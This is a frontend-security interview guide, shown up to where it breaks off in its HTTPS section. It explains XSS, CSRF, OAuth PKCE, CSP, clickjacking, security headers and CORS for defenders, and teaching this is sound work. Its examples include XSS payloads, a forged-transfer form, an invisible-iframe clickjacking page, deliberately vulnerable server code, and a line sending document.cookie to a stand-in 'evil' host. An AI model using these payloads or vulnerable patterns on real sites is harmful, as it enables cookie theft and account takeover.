SECTION 1 - XSS

Q1. What is XSS, and what is the difference between stored, reflected, and DOM-based XSS?

ROI: ★★★★★ Frequency: Extremely High

Short Answer

Cross-Site Scripting (XSS) is an injection attack where an attacker gets their JavaScript to run in another user's browser, in the context of your origin. Once their script runs on your origin it can do anything the user can: read the DOM, steal tokens, make authenticated requests, and impersonate the user. The three classic types differ by where the malicious payload comes from: stored (persisted on the server and served to victims), reflected (bounced back off a request parameter), and DOM-based (never touches the server — the vulnerability is entirely in client-side JS).

Detailed Answer

Stored (persistent) XSS

The payload is saved in your data store — a comment, a profile bio, a support ticket — and later rendered to every user who views it. This is the most dangerous variant because it is self-propagating and hits many victims without them clicking anything special. A classic example is the old MySpace "Samy" worm.

Reflected XSS

The payload lives in the request (typically a query string or form field) and is immediately reflected back in the response without being stored — e.g. a search page that prints You searched for: <script>...</script>. The attacker delivers it via a crafted link the victim clicks, so exploitation requires social engineering.

DOM-based XSS

The server is never involved in the injection. Untrusted data (from location.hash, document.referrer, postMessage, etc.) flows through a client-side "source" into a dangerous "sink" (innerHTML, eval, document.write) that executes it. Because the payload may sit only in the URL fragment, it can be invisible to server logs and WAFs.

TypePayload originExecutes when
StoredPersisted server-sideAny user views the tainted record
ReflectedRequest parameter, echoed onceVictim opens a crafted link
DOM-basedClient-side source (URL, postMessage)Client JS writes it into a sink

Code Example

// REFLECTED: server echoes the query param straight into HTML (vulnerable).
// GET /search?q=<script>steal()</script>
app.get("/search", (req, res) => {
  res.send(`<h1>Results for ${req.query.q}</h1>`); // NO escaping => XSS
});

// DOM-BASED: no server involvement at all.
// URL: https://app.com/#<img src=x onerror=steal()>
const frag = decodeURIComponent(location.hash.slice(1)); // SOURCE
document.getElementById("out").innerHTML = frag;         // SINK => executes

// The payload after # is never sent to the server, so server-side
// filtering cannot see or stop it.

Project Example

A B2B dashboard let users name their saved reports. Names were rendered with innerHTML in a legacy widget, and one tenant saved a report named <img src=x onerror="fetch('/api/keys').then(...)">. Every admin who opened the reports list executed that script under their own session — a stored XSS that leaked API keys. The fix was to render the name as text (never HTML) and add a CSP as defense-in-depth.

Senior Engineer Perspective

Interviewers want you to articulate the impact, not just the taxonomy: "XSS = arbitrary JS on your origin = full account takeover," because the attacker inherits the user's cookies, tokens, and CSRF ability. A strong follow-up: "Is XSS an input problem or an output problem?" The senior answer is output encoding — the same string is safe in one context (text) and lethal in another (HTML attribute, URL, JS). Filtering input alone is brittle; the durable defense is context-aware escaping at the sink plus a CSP as a second layer. Mention that OWASP now folds all three types under "Injection" (A03), reflecting that the root cause is untrusted data reaching an executable context.

Q2. How does React protect against XSS by default, and how does dangerouslySetInnerHTML reintroduce it?

ROI: ★★★★★ Frequency: Extremely High

Short Answer

React escapes any value you interpolate as a child in JSX. When you write {userInput}, React treats it as text and HTML-encodes <, >, &, and quotes, so a string like <script> is rendered as visible text, never parsed as markup. dangerouslySetInnerHTML is the deliberate escape hatch: it sets the node's innerHTML directly with no escaping, so any HTML/JS in that string is parsed and can execute. The word "dangerously" is a warning by design.

Detailed Answer

What React does and does not protect

React auto-escapes text children and, in modern React, string attribute values. It does not magically make every prop safe. Known dangerous surfaces remain:

  • dangerouslySetInnerHTML={{ __html: value }} — raw HTML injection.
  • href/src set to a javascript: URI — clicking runs script. (React 16.9+ warns, and React will not block every case.)
  • Spreading untrusted props: <div {...userControlledProps} /> can inject an onError/dangerouslySetInnerHTML.
  • Injecting untrusted CSS or style strings, or building a component type from user input.

Why the escape hatch exists

Sometimes you legitimately have trusted HTML — a CMS field, sanitized Markdown output, an email template. dangerouslySetInnerHTML exists so you can render it, but it shifts the entire responsibility for safety onto you. The rule: never pass unsanitized, user-influenced HTML to it.

Code Example

// SAFE: React escapes the text. "<script>" shows as literal characters.
function Comment({ text }) {
  return <p>{text}</p>;   // <script>alert(1)</script> renders as text
}

// DANGEROUS: raw innerHTML, no escaping => script/onerror executes.
function Bio({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />; // XSS if html is untrusted
}

// SUBTLE: javascript: URL injection via an attribute.
function Link({ url }) {
  return <a href={url}>click</a>; // url = "javascript:steal()" => runs on click
}
// Guard it:
const safeHref = /^https?:\/\//i.test(url) ? url : "#";

Project Example

A team rendered Markdown notes with dangerouslySetInnerHTML straight from the markdown-to-HTML output. Because the Markdown library allowed raw inline HTML, a user embedded <img src=x onerror=...> in a note and popped every viewer. The fix was one line conceptually: pipe the generated HTML through DOMPurify before handing it to dangerouslySetInnerHTML.

Senior Engineer Perspective

The trap interviewers set: "React is XSS-proof, right?" No — React removes the most common XSS (text interpolation) but leaves several sharp edges: dangerouslySetInnerHTML, javascript: URLs, prop spreading, and any direct DOM manipulation via refs (ref.current.innerHTML = ...) that bypasses React entirely. A senior also notes that server rendering (renderToString) and dangerous data injected into inline scripts (e.g. window.__STATE__ = ${JSON.stringify(state)}) can XSS if the state contains a </script> sequence — which is why you escape < when serializing state into HTML.

Q3. How do you safely render user-provided HTML (and why is DOMPurify the answer)?

ROI: ★★★★★ Frequency: High

Short Answer

If you must render HTML you did not fully author (rich-text comments, CMS content, Markdown), sanitize it first with a well-maintained library — the de facto standard on the client is DOMPurify. It parses the HTML, strips dangerous elements/attributes (<script>, event handlers, javascript: URLs) against an allow-list, and returns clean HTML you can pass to dangerouslySetInnerHTML. Do not hand-roll a regex "sanitizer" — HTML parsing is adversarial and you will lose.

Detailed Answer

Why an allow-list, not a block-list

Block-lists (strip <script>, strip onclick) always miss cases: SVG payloads, <math>, mutation XSS, namespace confusion, obscure event handlers. DOMPurify works on an allow-list model — only known-safe tags/attributes survive — and is continuously updated against new browser parsing quirks (mXSS). That maintenance is the whole point; a regex you wrote once will rot.

Where to sanitize

Sanitize as close to the sink as possible, and prefer doing it on both ends if you persist HTML: sanitize on write (server) to keep the store clean, and sanitize on render (client) as defense-in-depth. Configure DOMPurify to your real needs — e.g. forbid target on links or force rel="noopener".

Prefer not rendering HTML at all

The safest option is to avoid HTML: render user content as text, or use a structured format (Markdown rendered by a library that outputs safe React elements rather than an HTML string, or a JSON rich-text schema). If you never produce an HTML string from untrusted data, there is no sink to sanitize.

Code Example

import DOMPurify from "dompurify";

// Sanitize, then render. Only allow a small tag/attribute set.
function RichText({ html }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "ul", "ol", "li", "br"],
    ALLOWED_ATTR: ["href", "title"],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// Force safe link behavior via a hook (runs on every sanitize call).
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node.tagName === "A") {
    node.setAttribute("target", "_blank");
    node.setAttribute("rel", "noopener noreferrer");
  }
});

// ANTI-PATTERN — do NOT do this (regex "sanitizers" are trivially bypassed):
const bad = html.replace(/<script.*?>.*?<\/script>/gi, ""); // <img src=x onerror=..> survives

Project Example

A help-desk product let agents paste rich HTML from emails into ticket replies, which were then shown to customers. Raw rendering was an obvious stored-XSS vector. Wrapping every reply in DOMPurify.sanitize with a tight allow-list (formatting tags, links, images with https sources only) killed the vector while preserving the formatting agents needed. Sanitizing on both save and render meant even old poisoned records were neutralized on display.

Senior Engineer Perspective

Interviewers probe whether you know the limits: DOMPurify sanitizes HTML, not arbitrary contexts — it will not protect a value you drop into a javascript: URL, a CSS url(), or a JSON blob later eval'd. Context matters. A senior also mentions Trusted Types (a CSP feature) as the modern reinforcement: it makes dangerous sinks like innerHTML throw unless the string passed through a registered policy (which typically calls DOMPurify), turning "we forgot to sanitize" from a silent vulnerability into a runtime error. For SSR, note DOMPurify needs a DOM — use the jsdom-backed server build.

Q4. What is DOM-based XSS, and how do you validate/escape untrusted input on the client?

ROI: ★★★★ Frequency: High

Short Answer

DOM-based XSS happens entirely in the browser: untrusted data flows from a source (URL, location.hash, postMessage, localStorage) into a dangerous sink (innerHTML, eval, setTimeout(string), document.write, new Function) without ever going through the server. You prevent it by (1) avoiding dangerous sinks, (2) validating input against an expected shape (allow-list), and (3) escaping/encoding for the exact context you output into — text, attribute, URL, or JS.

Detailed Answer

Sources and sinks

Learn the common ones so you can audit code quickly:

  • Sources (attacker-controllable): location (href/search/hash), document.referrer, window.name, postMessage data, values read back from storage/cookies.
  • Sinks (execute strings): element.innerHTML/outerHTML, document.write, eval, Function, setTimeout/setInterval with a string, a.href = "javascript:...", jQuery's $(html).

Validation vs. escaping

They are different jobs. Validation rejects input that doesn't match an expected format (a numeric ID must be digits; a redirect target must be a known-good path). Escaping/encoding makes data safe for a specific output context so it is treated as data, not code. You often need both. Critically, escaping is context-specific: HTML-encoding is right for text, but a value going into a URL needs URL-encoding, and a value going into a JS string needs JS-string escaping.

postMessage is a common blind spot

A message listener that trusts event.data and writes it to the DOM is a classic DOM-XSS. Always check event.origin against an allow-list before using the data.

Code Example

// SAFE sink: textContent treats input as text, never markup.
el.textContent = untrusted;          // OK
// el.innerHTML = untrusted;         // DOM-XSS

// Validate a redirect target against an allow-list of internal paths.
function safeRedirect(next) {
  // reject absolute URLs and protocol-relative "//evil.com"
  if (typeof next !== "string" || !next.startsWith("/") || next.startsWith("//")) {
    return "/";
  }
  return next;
}

// Harden a postMessage listener: check origin before trusting data.
window.addEventListener("message", (event) => {
  if (event.origin !== "https://trusted.example.com") return; // reject others
  handle(event.data); // still validate shape before using
});

Project Example

An embedded payment widget communicated with the host page via postMessage. The host listener rendered event.data.message into a status banner with innerHTML and never checked event.origin. Any page that iframed the widget could post a crafted message and inject script into the host. The fix: verify event.origin against the known widget origin and switch the banner to textContent.

Senior Engineer Perspective

The senior signal is speaking in source-to-sink terms and knowing that DOM-XSS is invisible to server-side defenses — WAFs and server input filters never see a payload that lives in the URL fragment. Emphasize that in React you rarely touch raw sinks, but you reintroduce them via dangerouslySetInnerHTML, direct ref DOM writes, or third-party widgets. A great closing point: encoding must match the sink's context, and the cleanest architecture avoids sinks entirely by keeping untrusted data as data (text nodes, typed props) rather than ever serializing it into an executable string.

SECTION 2 - AUTH & TOKENS

Q5. Where should you store JWTs/access tokens — localStorage vs an httpOnly cookie?

ROI: ★★★★★ Frequency: Extremely High

Short Answer

It is a trade-off between XSS exposure and CSRF exposure, and there is no free lunch. localStorage is readable by any JS on your origin, so a single XSS steals the token — but it is immune to CSRF because the browser never attaches it automatically. An httpOnly cookie is invisible to JS (so XSS cannot read it) but is sent automatically with requests, which opens CSRF unless you add SameSite/CSRF-token defenses. The generally recommended pattern for SPAs is a short-lived access token kept in memory plus a refresh token in an httpOnly, Secure, SameSite cookie.

Detailed Answer

The two threat models

StorageReadable by JS?Auto-sent?Main risk
localStorage / sessionStorageYesNo (you attach it)XSS steals it outright
Non-httpOnly cookieYesYesXSS and CSRF
httpOnly cookieNoYesCSRF (mitigate with SameSite)
In-memory (JS variable)Yes (this tab only)NoLost on refresh; still XSS-readable while live

Why "in memory + httpOnly refresh cookie" is favored

The access token lives in a JS variable (or React state/context), so it is never persisted to disk and vanishes on tab close. It is short-lived (minutes), so even if stolen the window is small. The long-lived refresh token sits in an httpOnly, Secure, SameSite=Strict/Lax cookie scoped to the auth endpoint, so JS can't read it and CSRF is constrained. On load or 401, the app silently calls /refresh to mint a new access token.

The honest caveat

If you have XSS, you are in trouble regardless: even with an httpOnly cookie, injected script can just make authenticated requests from the victim's browser (the cookie rides along) — it just can't exfiltrate the token itself. So token storage is about reducing blast radius, not a substitute for preventing XSS.

Code Example

// Access token in memory (module scope), refresh via httpOnly cookie.
let accessToken = null; // never in localStorage

async function refresh() {
  // browser sends the httpOnly refresh cookie automatically
  const res = await fetch("/auth/refresh", { method: "POST", credentials: "include" });
  const { token } = await res.json();
  accessToken = token;
  return token;
}

async function api(path, opts = {}) {
  let res = await fetch(path, {
    ...opts,
    headers: { ...opts.headers, Authorization: `Bearer ${accessToken}` },
  });
  if (res.status === 401) {         // access token expired
    await refresh();                // silent refresh
    res = await fetch(path, {
      ...opts,
      headers: { ...opts.headers, Authorization: `Bearer ${accessToken}` },
    });
  }
  return res;
}

// Server sets the refresh cookie like:
// Set-Cookie: refresh=...; HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh

Project Example

A fintech SPA originally stored a long-lived JWT in localStorage. A pen-test found one reflected-XSS on an error page; the tester exfiltrated the JWT and demonstrated full account access with no expiry. We moved to a 10-minute in-memory access token plus an httpOnly refresh cookie. The same XSS could still act as the user briefly, but it could no longer steal a durable credential to use offline — and rotating refresh tokens let us revoke sessions server-side.

Senior Engineer Perspective

The mistake juniors make is treating this as a settled "localStorage is always wrong" rule. The senior answer frames it as XSS-exposure vs CSRF-exposure and states the mitigations for each path. Key nuances to raise: (1) an httpOnly cookie doesn't stop XSS from acting as the user, so preventing XSS (CSP, sanitization) is still the primary control; (2) refresh tokens should rotate and be revocable server-side; (3) access tokens should be short-lived so theft has a small window; (4) for cross-site cookie setups you need SameSite=None; Secure plus a CSRF token, which reintroduces complexity. There is no universally correct answer — the interviewer wants to hear you reason about the specific deployment.

Q6. What is CSRF, why are cookie-based SPAs vulnerable, and how do tokens and SameSite cookies defend against it?

ROI: ★★★★★ Frequency: High

Short Answer

Cross-Site Request Forgery (CSRF) tricks a logged-in user's browser into sending an unwanted authenticated request to your site from a different site. It works because browsers automatically attach cookies to requests to your origin regardless of who initiated them. If your session is a cookie and the server trusts "cookie present = authorized," a malicious page can silently trigger state-changing actions (transfer money, change email) as the victim. Defenses: a CSRF token the attacker can't know, and SameSite cookies that stop the browser from sending the cookie on cross-site requests.

Detailed Answer

Why cookies are the root cause

CSRF exploits ambient authority: the cookie is sent by the browser automatically, so the request looks authentic to the server even though the user never intended it. Note this is exactly why token-in-header schemes (Authorization: Bearer read from JS) are not vulnerable to classic CSRF — the attacker's page can't read your token to set the header, and the browser won't attach it for them.

Defense 1 — SameSite cookies

  • SameSite=Strict: cookie is never sent on any cross-site request (even top-level navigation). Strongest, but can log users out when arriving via external links.
  • SameSite=Lax (modern browser default): sent on top-level GET navigations but not on cross-site POST/subresource requests — blocks the classic form-POST CSRF while keeping normal link-following usable.
  • SameSite=None; Secure: sent cross-site (needed for third-party contexts); requires HTTPS and reopens CSRF, so pair with a token.

Defense 2 — CSRF tokens

The server issues an unpredictable token tied to the session; the SPA must echo it back in a header or body on state-changing requests. The attacker's cross-site page cannot read it (Same-Origin Policy), so it cannot forge the request. Two common patterns: the synchronizer token (server stores/validates it) and the double-submit cookie (token sent both as a cookie and a header; server checks they match).

Code Example

// Attacker page (evil.com) — no JS token access needed; the cookie auto-attaches.
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>  // fires as the logged-in victim

// Defense: server sets a SameSite cookie AND requires a CSRF header.
// Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax
// Set-Cookie: csrf=RANDOM; Secure; SameSite=Lax   (readable, double-submit)

// SPA echoes the csrf cookie value in a header the attacker cannot set cross-site.
function csrfFetch(url, opts = {}) {
  const token = getCookie("csrf");
  return fetch(url, {
    ...opts,
    credentials: "include",
    headers: { ...opts.headers, "X-CSRF-Token": token },
  });
}

Project Example

An admin portal used a plain session cookie with no SameSite attribute and no CSRF token. A crafted email with an auto-submitting form let an attacker create admin users when a signed-in admin merely opened it. Two changes closed it: setting SameSite=Lax on the session cookie (killing the cross-site POST outright) and adding a double-submit CSRF token validated on every mutating endpoint as defense-in-depth for browsers/edge cases where SameSite couldn't be relied on.

Senior Engineer Perspective

The distinction interviewers love: XSS defeats CSRF defenses. If an attacker has XSS on your origin, they run in your context, can read CSRF tokens, and same-origin requests sail through — so CSRF protection assumes you're already XSS-free. Also be precise that SameSite is a strong default layer but not a complete solution: it doesn't protect non-browser clients, can be bypassed via same-site subdomains, and Lax still allows cross-site top-level GETs (so never perform state changes on GET). The mature stance: SameSite + a token, and never rely on a single control.

Q7. How does OAuth2 / OIDC with PKCE work for a SPA, and why is the implicit flow dead?

ROI: ★★★★ Frequency: Medium

Short Answer

A SPA is a public client — it can't keep a client secret, because anything shipped to the browser is readable. The current best practice is the Authorization Code flow with PKCE (Proof Key for Code Exchange). The app generates a random code_verifier, sends its hash (code_challenge) when redirecting to the authorization server, receives a one-time authorization code on redirect back, then exchanges that code for tokens while proving it knows the original verifier. The old implicit flow (tokens returned directly in the URL fragment) is deprecated because tokens leaked into browser history, logs, and referrers, and had no protection against interception. OIDC adds an ID token (who the user is) on top of OAuth2 (delegated authorization).

Detailed Answer

Why PKCE

Without a client secret, an intercepted authorization code could be redeemed by an attacker. PKCE binds the code to the client that started the flow: only the party holding the original code_verifier (which never left the browser) can exchange the code, so a stolen code is useless. Originally designed for mobile apps, PKCE is now recommended for all OAuth clients, SPAs included.

OAuth2 vs OIDC

  • OAuth2 = authorization: "this app may access these resources on the user's behalf" (access token, scopes).
  • OIDC = authentication layer on top: an ID token (a JWT) that proves the user's identity, plus a standard /userinfo endpoint. Use OIDC when you want "log in with X," not just API access.

The flow, step by step

  1. SPA creates code_verifier (random) and code_challenge = SHA256(verifier), plus a state value for CSRF protection.
  2. Redirect to the auth server's /authorize with response_type=code, code_challenge, state, scopes.
  3. User authenticates; auth server redirects back with a one-time code and echoes state (verify it matches).
  4. SPA POSTs the code + original code_verifier to /token; receives access token (+ ID token, + refresh token).

Code Example

// PKCE setup (conceptual — use a vetted library like oidc-client-ts in real apps).
function base64url(buf) {
  return btoa(String.fromCharCode(...new Uint8Array(buf)))
    .replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

async function startLogin() {
  const verifier = base64url(crypto.getRandomValues(new Uint8Array(32)));
  const digest = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(verifier));
  const challenge = base64url(digest);
  const state = base64url(crypto.getRandomValues(new Uint8Array(16)));

  sessionStorage.setItem("pkce_verifier", verifier); // needed for the token exchange
  sessionStorage.setItem("oauth_state", state);

  const params = new URLSearchParams({
    response_type: "code",
    client_id: CLIENT_ID,
    redirect_uri: REDIRECT_URI,
    scope: "openid profile email",
    code_challenge: challenge,
    code_challenge_method: "S256",
    state,
  });
  location.assign(`${AUTH_SERVER}/authorize?${params}`);
}

Project Example

A dashboard migrated from a legacy implicit-flow integration (access token landing in window.location.hash) to Authorization Code + PKCE via oidc-client-ts. Beyond fixing the token-in-URL leak, the switch let us obtain refresh tokens with rotation and keep the access token in memory, and the state parameter closed the authorization-code CSRF hole. We deliberately used a maintained library rather than hand-rolling the crypto and redirect handling.

Senior Engineer Perspective

Key senior points: (1) a SPA is a public client, so never embed a client secret; PKCE replaces it. (2) The state parameter is mandatory to prevent CSRF on the redirect, and (3) nonce (OIDC) binds the ID token to the request to prevent replay. (4) Don't hand-roll OAuth — subtle mistakes are catastrophic; use a certified library. A forward-looking note: many teams are moving auth to the server (BFF — Backend-for-Frontend pattern) so tokens never touch the browser at all, sidestepping browser token-storage risk entirely; mentioning the BFF pattern signals current awareness.

SECTION 3 - REQUESTS & HEADERS

Q8. What is a Content Security Policy (CSP) and how does it mitigate XSS?

ROI: ★★★★★ Frequency: High

Short Answer

A Content Security Policy is an HTTP response header (Content-Security-Policy) that tells the browser which sources of content are allowed to load and execute — scripts, styles, images, connections, frames. Its headline benefit is XSS mitigation: a well-configured CSP blocks inline scripts and scripts from unapproved origins, so even if an attacker injects <script>, the browser refuses to run it. CSP is defense-in-depth — a safety net for when output encoding fails, not a replacement for it.

Detailed Answer

How it stops injected script

The most impactful directive is script-src. If your policy doesn't include 'unsafe-inline', the browser will not execute inline <script>alert(1)</script> or onerror= handlers — which is exactly what most XSS payloads rely on. Scripts are only run if they come from an allow-listed origin, or carry a matching nonce or hash.

Nonces and hashes (the modern approach)

Because allow-listing origins is leaky (a trusted CDN can host attacker files) and 'unsafe-inline' defeats the purpose, the recommended strategy is a nonce-based, strict CSP: the server generates a fresh random nonce per response, adds it to the CSP (script-src 'nonce-abc123') and to each legitimate <script nonce="abc123">. Injected scripts lack the nonce and are blocked. 'strict-dynamic' lets nonced scripts load further scripts they trust.

Report-only rollout

Deploy with Content-Security-Policy-Report-Only first: the browser reports violations to a report-uri/report-to endpoint without blocking, so you can find what would break before enforcing.

Code Example

// A reasonably strict, nonce-based policy (sent as a response header):
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m' 'strict-dynamic';
  style-src 'self';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'self'

// Server adds the same nonce to each trusted script tag:
<script nonce="r4nd0m" src="/app.js"></script>

// Injected by an attacker via XSS — has no nonce, so the browser blocks it:
<script>fetch("//evil/?c="+document.cookie)</script>   // NOT executed

Project Example

After a near-miss stored-XSS, a team added a report-only CSP for two weeks, fixed the inline scripts and third-party origins it flagged, then enforced a nonce-based policy. Months later a new vulnerable dependency introduced an XSS sink — but the CSP blocked the injected exfiltration script and fired a violation report, turning what would have been a breach into an alert. That is exactly the defense-in-depth value proposition.

Senior Engineer Perspective

Interviewers check whether you know CSP's limits and pitfalls: (1) 'unsafe-inline' and 'unsafe-eval' largely neuter the XSS protection — avoid them; frameworks that need eval or inline styles push people toward weak policies. (2) Origin allow-lists are commonly bypassable (JSONP endpoints, open CDNs), which is why Google's research pushes nonce + strict-dynamic over host allow-lists. (3) CSP also does more than script control — frame-ancestors replaces X-Frame-Options, connect-src limits exfiltration channels, and Trusted Types (require-trusted-types-for 'script') locks down DOM sinks. Framing CSP as a layered safety net, not a primary fix, is the mature position.

Q9. What is clickjacking, and how do X-Frame-Options and frame-ancestors stop it?

ROI: ★★★★ Frequency: Medium

Short Answer

Clickjacking (UI redressing) is an attack where a malicious site loads your page in a transparent or disguised iframe and tricks the user into clicking something they can't see — the invisible "Delete account" or "Confirm payment" button of your app, overlaid under an innocent-looking decoy. You defend against it by telling the browser who is allowed to frame your pages: the legacy header X-Frame-Options (DENY or SAMEORIGIN) and the modern, more flexible CSP directive frame-ancestors.

Detailed Answer

How the attack works

The attacker's page sets your site in an <iframe> with opacity: 0 (or clipped/positioned) and places bait UI beneath the mouse so that a click the user thinks lands on "Play video" actually lands on your framed "Transfer funds" button. Because the click happens inside your authenticated frame, the action executes as the logged-in user.

The two controls

  • X-Frame-Options: DENY — the page may never be framed. SAMEORIGIN — only your own origin may frame it. Widely supported but coarse (only one origin, no allow-list).
  • Content-Security-Policy: frame-ancestors 'none' (or a list of allowed origins) — the modern replacement, supports multiple origins and is part of CSP. When both are present, frame-ancestors takes precedence in modern browsers.

Which to use

Send both for maximum coverage: frame-ancestors for modern browsers, X-Frame-Options for older ones. Use DENY/'none' unless you have a legitimate need to be embedded (then allow-list the specific parent origins).

Code Example

// Attacker's page overlays your app invisibly on top of bait.
<style>
  iframe { position: absolute; top: 0; opacity: 0; width: 800px; height: 600px; }
  .bait  { position: absolute; top: 180px; left: 120px; } /* under the hidden button */
</style>
<button class="bait">Claim your free prize!</button>
<iframe src="https://yourbank.com/transfer"></iframe>  // click lands here

// Defense — send BOTH headers from your server:
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'

// If you must allow specific embedders:
Content-Security-Policy: frame-ancestors 'self' https://partner.example.com

Project Example

A SaaS app's account-settings page had no framing protection. A security researcher demonstrated a clickjacking PoC that could toggle "make workspace public" with a single disguised click. Adding X-Frame-Options: SAMEORIGIN plus frame-ancestors 'self' at the CDN/edge for all HTML responses closed it globally in one config change, while still permitting the app's own in-product preview iframes.

Senior Engineer Perspective

Strong candidates note that X-Frame-Options is effectively superseded by frame-ancestors (which supports multiple origins and finer control), but you still send both for legacy coverage. A good follow-up: "Is a JavaScript frame-buster (if (top !== self) top.location = self.location) enough?" No — frame-busting scripts have been repeatedly bypassed (sandboxed iframes, onbeforeunload tricks) and shouldn't be relied on. The header-based defense is the correct control. Also mention that these headers should be applied at the edge/proxy to guarantee coverage across every HTML route, not per-component.

Q10. What are the key security response headers a frontend should ship?

ROI: ★★★★ Frequency: Medium

Short Answer

Beyond CSP and framing controls, a hardened frontend sends a small set of response headers: HSTS (force HTTPS), X-Content-Type-Options: nosniff (stop MIME sniffing), Referrer-Policy (limit URL leakage), Permissions-Policy (disable unused browser features like camera/geolocation), and the framing/CSP headers already covered. These are cheap, set once at the edge/server, and collectively raise the cost of many attacks.

Detailed Answer

HeaderWhat it does
Strict-Transport-Security (HSTS)Forces HTTPS for a max-age period, preventing SSL-strip downgrade. Add includeSubDomains; preload for full coverage.
Content-Security-PolicyControls what can load/execute; primary XSS safety net.
X-Content-Type-Options: nosniffStops the browser from guessing (and mis-executing) content types, e.g. treating an uploaded file as script.
X-Frame-Options / frame-ancestorsClickjacking protection.
Referrer-PolicyLimits how much of the URL is sent in the Referer header, avoiding leaking tokens/paths to third parties. strict-origin-when-cross-origin is a good default.
Permissions-PolicyAllow/deny powerful features (camera, mic, geolocation, USB) per origin to shrink attack surface.
Cross-Origin-Opener-Policy / -Embedder-Policy / -Resource-PolicyIsolate your origin (COOP/COEP/CORP) to defend against cross-origin leaks and Spectre-class attacks; COOP+COEP enable cross-origin isolation.

The old X-XSS-Protection header is deprecated and should be set to 0 or omitted — modern browsers removed the auditor it controlled, and CSP is the replacement.

Code Example

// Typical hardening header set (server/edge config):
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), camera=(), microphone=()

// Verify what a site actually sends:
//   curl -sI https://yourapp.com | grep -iE "strict-transport|content-security|x-content"

Project Example

A compliance audit flagged our app for missing security headers. We centralized them in the CDN response-header config so every route inherited them, then confirmed with an external scanner. HSTS with preload prevented downgrade attacks on public Wi-Fi, and nosniff closed a subtle bug where a user-uploaded SVG could be served with a sniffable type and execute script. One config file, broad risk reduction.

Senior Engineer Perspective

The senior framing: these headers are defense-in-depth and belong at the edge/reverse-proxy so coverage is guaranteed and consistent, not scattered in app code. Know the gotchas: HSTS preload is hard to undo (you're committing to HTTPS-only, including subdomains, for a long time), so roll it out carefully. Don't over-restrict Permissions-Policy and break a feature you actually use. And be able to say why each one matters rather than reciting a checklist — e.g. nosniff matters most where you serve user-uploaded files. Tools like Mozilla Observatory or securityheaders.com give a quick external grade.

Q11. Is CORS a security mechanism — and why is it not a substitute for authorization?

ROI: ★★★★ Frequency: High

Short Answer

CORS (Cross-Origin Resource Sharing) is a controlled relaxation of the browser's Same-Origin Policy, not a server-side access control. It governs whether a browser will let JavaScript on origin A read a response from origin B. It protects users from one site's script silently reading another site's data — it does not protect your API from being called. Non-browser clients (curl, Postman, servers) ignore CORS entirely. So authentication and authorization must live in your backend; CORS is never a substitute.

Detailed Answer

What CORS actually controls

By default the Same-Origin Policy lets the browser send a cross-origin request but blocks JS from reading the response. CORS lets the server opt in by returning headers like Access-Control-Allow-Origin. For "non-simple" requests the browser first sends a preflight OPTIONS request; the server's response headers decide whether the real request/read is permitted.

The common misconception

People think "CORS blocks other sites from hitting my API." It does not. The request often still reaches and executes on your server; CORS only stops the attacker's browser-side JS from reading the response. And any non-browser tool bypasses it completely. Therefore an endpoint with lax auth is vulnerable regardless of CORS config.

Dangerous CORS misconfigurations

  • Reflecting the request Origin back into Access-Control-Allow-Origin and setting Access-Control-Allow-Credentials: true — this lets any site make credentialed requests and read the response. Effectively "allow all origins with cookies."
  • Using Access-Control-Allow-Origin: * together with credentials (browsers forbid this combo, but people try to work around it insecurely).
  • Over-broad allow-lists that include untrusted subdomains.

Code Example

// DANGEROUS: reflecting Origin + allowing credentials = any site reads your data.
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", req.headers.origin); // reflects ANY origin
  res.header("Access-Control-Allow-Credentials", "true");        // + cookies => bad
  next();
});

// SAFER: explicit allow-list, and remember CORS != authz.
const ALLOWED = new Set(["https://app.example.com"]);
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (ALLOWED.has(origin)) {
    res.header("Access-Control-Allow-Origin", origin);
    res.header("Access-Control-Allow-Credentials", "true");
    res.header("Vary", "Origin"); // caches must key on Origin
  }
  next();
});
// The endpoint STILL must verify the session/token itself.

Project Example

A developer "fixed" CORS errors by reflecting the incoming Origin and enabling credentials — copy-pasted from a blog. A pen-test showed any malicious website could now make authenticated calls (cookies attached) and read private user data cross-origin. The correct fix was a strict origin allow-list plus Vary: Origin, and, importantly, confirming every endpoint independently validated the session so that CORS was never the thing standing between an attacker and the data.

Senior Engineer Perspective

The line interviewers want: "CORS protects the user's browser, not my server." A relaxed CORS policy is an attack enabler (it lets malicious sites read responses), never an authorization control. Nuances that impress: preflight caching via Access-Control-Max-Age; the credentialed-request rules (can't use * with credentials, must reflect an exact origin and set Vary: Origin); and that CORS is unrelated to CSRF — SameSite cookies, not CORS, address CSRF. If someone says "just set Allow-Origin: * to make it work," that's a red flag you should catch.

Q12. Why does HTTPS matter for a SPA, and what is mixed content?

ROI: ★★★ Frequency: Medium

Short Answer

HTTPS gives you confidentiality, integrity, and authentication of the connection: no one on the network can read or tamper with your traffic, and the user knows they're talking to the real server. Without it, an attacker on the same network can inject script into your page or steal tokens in transit. Mixed content is when an HTTPS page loads sub-resources (scripts, images, XHR) over plain HTTP — it reopens exactly the risks HTTPS closed, so browsers block active mixed content (scripts, iframes, fetch) and warn on passive content (images).

Detailed Answer

Why plain HTTP breaks a SPA's security model

Every guarantee above (CSP, token secrecy, integrity of your JS bundle) assumes the bytes arrive untampered. Over HTTP, a man-in-the-middle can rewrite your JavaScript on the wire and inject a keylogger — no XSS needed. That's why tokens must only travel over HTTPS and cookies must be marked Secure.

Mixed content categories

